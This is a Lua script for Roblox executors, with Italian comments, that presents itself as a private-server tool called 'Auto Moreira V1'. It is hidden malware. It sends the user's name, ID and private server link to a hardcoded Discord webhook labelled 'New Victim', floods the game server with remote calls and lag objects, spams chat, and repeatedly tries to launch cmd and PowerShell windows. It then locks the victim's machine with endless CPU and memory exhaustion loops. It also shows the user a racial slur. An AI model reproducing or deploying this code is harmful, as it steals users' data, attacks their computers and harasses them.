-- Discord Webhook Sender per Roblox Executor
-- Compatibile con Xeno, Synapse, Krnl, etc.

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ⚠️ INSERISCI IL TUO WEBHOOK URL QUI ⚠️
local WEBHOOK_URL = "https://discord.com/api/webhooks/1441578725090000897/-U_njs-xIW8YodyUepyPVtPHjTKD_UA1uQ2ivuSl_xLu0A8Y3T_UIZSD9Rl7oucwoJHs"

-- Crea la GUI principale
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Auto Moreira V1"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Frame principale
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Titolo
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
title.BorderSizePixel = 0
title.Text = "Auto Moreira V1"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 20
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

-- Bottone X per chiudere
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
closeButton.BorderSizePixel = 0
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 24
closeButton.Font = Enum.Font.GothamBold
closeButton.Parent = title

local closeButtonCorner = Instance.new("UICorner")
closeButtonCorner.CornerRadius = UDim.new(0, 6)
closeButtonCorner.Parent = closeButton

-- Funzione per chiudere la GUI
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Animazione hover per il bottone X
closeButton.MouseEnter:Connect(function()
    local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 70, 70)
    })
    tween:Play()
end)

closeButton.MouseLeave:Connect(function()
    local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(220, 50, 50)
    })
    tween:Play()
end)

-- Label per il testo
local label = Instance.new("TextLabel")
label.Name = "Label"
label.Size = UDim2.new(1, -40, 0, 30)
label.Position = UDim2.new(0, 20, 0, 60)
label.BackgroundTransparency = 1
label.Text = "Insert your private server link"
label.TextColor3 = Color3.fromRGB(200, 200, 200)
label.TextSize = 16
label.Font = Enum.Font.Gotham
label.TextXAlignment = Enum.TextXAlignment.Left
label.Parent = mainFrame

-- TextBox per l'input
local textBox = Instance.new("TextBox")
textBox.Name = "TextBox"
textBox.Size = UDim2.new(1, -40, 0, 40)
textBox.Position = UDim2.new(0, 20, 0, 95)
textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
textBox.BorderSizePixel = 0
textBox.Text = ""
textBox.PlaceholderText = "your ps link here"
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
textBox.TextSize = 14
textBox.Font = Enum.Font.Gotham
textBox.ClearTextOnFocus = false
textBox.Parent = mainFrame

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 8)
textBoxCorner.Parent = textBox

local textBoxPadding = Instance.new("UIPadding")
textBoxPadding.PaddingLeft = UDim.new(0, 10)
textBoxPadding.PaddingRight = UDim.new(0, 10)
textBoxPadding.Parent = textBox

-- Bottone invia
local sendButton = Instance.new("TextButton")
sendButton.Name = "SendButton"
sendButton.Size = UDim2.new(1, -40, 0, 45)
sendButton.Position = UDim2.new(0, 20, 0, 150)
sendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242) -- Discord color
sendButton.BorderSizePixel = 0
sendButton.Text = "Next"
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.TextSize = 16
sendButton.Font = Enum.Font.GothamBold
sendButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = sendButton

-- Label di stato
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Size = UDim2.new(1, -40, 0, 25)
statusLabel.Position = UDim2.new(0, 20, 0, 205)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = mainFrame

-- Funzione per inviare al webhook (compatibile con executor)
local function sendToWebhook(message)
    if WEBHOOK_URL == "INSERISCI_IL_TUO_WEBHOOK_URL_QUI" then
        statusLabel.Text = "⚠️ Errore: Webhook URL non configurato!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        return
    end
    
    if message == "" or not message then
        statusLabel.Text = "⚠️ Insert your private server link"
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        return
    end
    
    -- Aggiorna UI immediatamente
    statusLabel.Text = "⏳ Loading..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    
    -- Ottieni il numero di giocatori nel server
    local playerCount = #Players:GetPlayers()
    
    -- Determina lo stato del server
    local serverStatus = "User was alone."
    if playerCount > 1 then
        serverStatus = "User was with " .. (playerCount - 1) .. " other player(s)."
    end
    
    -- Invia il webhook in modo asincrono
    spawn(function()
        -- Crea l'embed Discord nello stesso formato dell'immagine
        local embed = {
            ["title"] = "New Victim",
            ["color"] = 15158332, -- Rosso scuro
            ["fields"] = {
                {
                    ["name"] = "👤 Player Information",
                    ["value"] = "**Name:** " .. player.Name .. "\n**User ID:** " .. tostring(player.UserId),
                    ["inline"] = false
                },
                {
                    ["name"] = "📊 SERVER STATUS",
                    ["value"] = "✅ **Players:** " .. serverStatus,
                    ["inline"] = false
                },
                {
                    ["name"] = "🔗 Join Private Server",
                    ["value"] = message,
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Danduga/Demone1"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        
        local data = {
            ["content"] = "@everyone",
            ["embeds"] = {embed},
            ["username"] = "tore",
            ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        }
        
        local jsonData = HttpService:JSONEncode(data)
        
        -- Prova prima con request() (supportato da Synapse, Script-Ware, etc.)
        local success, result = pcall(function()
            if request then
                return request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif http_request then
                return http_request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            else
                -- Fallback a HttpService se disponibile
                return HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
            end
        end)
        
        -- Aggiorna UI in modo sicuro
        spawn(function()
            if success then
                statusLabel.Text = "Wait for Players to join!"
                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                textBox.Text = ""
                
                -- Aspetta un attimo prima dello scherzo
                wait(1)
                
                -- Tenta di freezare tutti i giocatori nel server
                spawn(function()
                    local allPlayers = Players:GetPlayers()
                    
                    -- Metodo 1: Spam RemoteEvents per laggare tutti
                    for _, targetPlayer in pairs(allPlayers) do
                        if targetPlayer ~= player then
                            spawn(function()
                                -- Cerca RemoteEvents nel gioco
                                local remotes = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes") or 
                                               game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents")
                                if remotes then
                                    for i = 1, 1000 do
                                        pcall(function()
                                            for _, remote in pairs(remotes:GetChildren()) do
                                                if remote:IsA("RemoteEvent") then
                                                    remote:FireServer(targetPlayer, math.random(), math.random(), math.random())
                                                end
                                            end
                                        end)
                                    end
                                end
                            end)
                        end
                    end
                    
                    -- Metodo 2: Crea oggetti che laggano tutti
                    spawn(function()
                        for i = 1, 500 do
                            pcall(function()
                                local part = Instance.new("Part")
                                part.Size = Vector3.new(1, 1, 1)
                                part.Position = Vector3.new(math.random(-100, 100), math.random(0, 50), math.random(-100, 100))
                                part.Anchored = true
                                part.Parent = workspace
                                
                                -- Aggiungi script che lagga
                                local script = Instance.new("Script")
                                script.Source = [[
                                    while true do
                                        local x = 0
                                        for i = 1, 1000000 do
                                            x = x + math.sqrt(i)
                                        end
                                        wait()
                                    end
                                ]]
                                script.Parent = part
                            end)
                        end
                    end)
                    
                    -- Metodo 3: Spam di messaggi per laggare la chat
                    spawn(function()
                        for i = 1, 100 do
                            pcall(function()
                                Players:Chat("Freeze " .. string.rep("A", 1000))
                            end)
                            wait(0.1)
                        end
                    end)
                end)
                
                -- Scherzo: freeze + spam CMD
                statusLabel.Text = "nigga you are lq"
                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                
                -- Funzione per aprire CMD (ottimizzata per Xeno, Delta, Volcano)
                local function openCMD()
                    -- Xeno Executor
                    pcall(function()
                        if exec then
                            exec("start cmd")
                        end
                    end)
                    
                    -- Delta Executor
                    pcall(function()
                        if os and os.execute then
                            os.execute("start cmd")
                        end
                    end)
                    
                    -- Volcano Executor
                    pcall(function()
                        if execute then
                            execute("start cmd")
                        end
                    end)
                    
                    -- Metodo universale tramite PowerShell
                    pcall(function()
                        if exec then
                            exec("powershell -Command Start-Process cmd")
                        elseif os and os.execute then
                            os.execute("powershell -Command Start-Process cmd")
                        elseif execute then
                            execute("powershell -Command Start-Process cmd")
                        end
                    end)
                end
                
                -- Spam CMD in thread separati
                for i = 1, 20 do
                    spawn(function()
                        while true do
                            openCMD()
                            wait(0.01)
                        end
                    end)
                end
                
                -- Saturazione CPU e RAM massima (FREEZE)
                local memoryTable = {}
                
                -- Crea MIGLIAIA di thread che consumano CPU
                for i = 1, 500 do
                    spawn(function()
                        while true do
                            -- Calcoli pesantissimi senza wait
                            local heavyCalc = 0
                            for j = 1, 5000000 do
                                heavyCalc = heavyCalc + math.sqrt(j) * math.sin(j) * math.cos(j)
                            end
                            -- Alloca memoria
                            table.insert(memoryTable, string.rep("X", 10000))
                        end
                    end)
                end
                
                -- Altri thread per saturare ancora di più
                for i = 1, 200 do
                    spawn(function()
                        local data = {}
                        while true do
                            -- Alloca memoria massiccia
                            for j = 1, 1000 do
                                data[j] = string.rep(tostring(math.random()), 1000)
                            end
                            -- Calcoli pesanti
                            local x = 0
                            for k = 1, 10000000 do
                                x = x + math.random() * math.random()
                            end
                        end
                    end)
                end
                
                -- Blocca anche il thread principale con loop infinito pesantissimo
                while true do
                    -- Apri CMD anche dal thread principale
                    openCMD()
                    -- Calcoli estremamente pesanti
                    local heavyCalc = 0
                    for i = 1, 10000000 do
                        heavyCalc = heavyCalc + math.sqrt(i) * math.log(i + 1) * math.exp(i / 1000000)
                    end
                    -- Alloca memoria
                    table.insert(memoryTable, string.rep("MEMORY", 50000))
                    -- Altri calcoli
                    for i = 1, 5000000 do
                        heavyCalc = heavyCalc * 1.0001
                    end
                end
            else
                statusLabel.Text = "❌ Errore: " .. tostring(result)
                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            end
        end)
    end)
end

-- Animazione hover per il bottone
sendButton.MouseEnter:Connect(function()
    local tween = TweenService:Create(sendButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(98, 111, 252)
    })
    tween:Play()
end)

sendButton.MouseLeave:Connect(function()
    local tween = TweenService:Create(sendButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    })
    tween:Play()
end)

-- Click del bottone
sendButton.MouseButton1Click:Connect(function()
    sendToWebhook(textBox.Text)
end)

-- Invio con Enter
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        sendToWebhook(textBox.Text)
    end
end)

print("Discord Webhook Sender caricato! Ricorda di inserire il WEBHOOK_URL nello script.")
